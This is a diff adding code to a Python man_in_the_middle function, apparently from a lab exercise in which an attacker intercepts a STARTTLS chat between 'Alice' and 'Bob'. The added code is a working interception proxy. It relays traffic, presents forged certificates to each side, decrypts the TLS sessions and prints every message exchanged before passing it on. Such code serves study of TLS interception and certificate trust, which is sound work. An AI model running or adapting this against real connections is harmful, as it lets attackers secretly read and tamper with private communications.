@@ -42,3 +42,48 @@ def man_in_the_middle(host1, host2):
     except socket.gaierror:
         print('Could not resolve hostname for Bob')
         sys.exit()
+# Create a socket to connect to Bob
+    try:
+        bob = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    except socket.error as e:
+        print(f'Error creating socket for Bob: {e}')
+        sys.exit()
+
+    bob.connect((remote_ip_bob, port))  # Connect to Bob
+    bob.send(data)  # Relay data from Alice to Bob
+    data = bob.recv(50)  # Receive Bob's response
+    conn.send(data)  # Relay Bob's response to Alice
+
+    # Perform STARTTLS handshake and wrap connections with SSL
+    conn = ssl.wrap_socket(conn, keyfile="/root/fake-bob-private-key.pem", certfile="/root/fakebob.crt",
+                           ca_certs="/root/root.crt", server_side=True, cert_reqs=ssl.CERT_REQUIRED,
+                           ssl_version=ssl.PROTOCOL_TLS)
+    data = conn.recv(100).decode()  # Receive TLS-encrypted message from Alice
+    print("Message from Alice: " + data)
+
+    bob = ssl.wrap_socket(bob, keyfile="/root/fake-alice-private-key.pem", certfile="/root/fakealice.crt",
+                          server_side=False, ca_certs="/root/root.crt", cert_reqs=ssl.CERT_REQUIRED,
+                          ssl_version=ssl.PROTOCOL_TLS)
+    bob.send(data.encode())  # Relay Alice's message to Bob
+
+    # Continue relaying messages between Alice and Bob
+    while True:
+        data = bob.recv(100).decode()
+        print("Message from Bob: " + data)
+        if data == "chat_close":
+            conn.send(data.encode())
+            conn.close()
+            bob.close()
+            s.close()
+            break
+        conn.send(data.encode())
+
+        data = conn.recv(100).decode()
+        print("Message from Alice: " + data)
+        if data == "chat_close":
+            bob.send(data.encode())
+            conn.close()
+            bob.close()
+            s.close()
+            break
+        bob.send(data.encode())
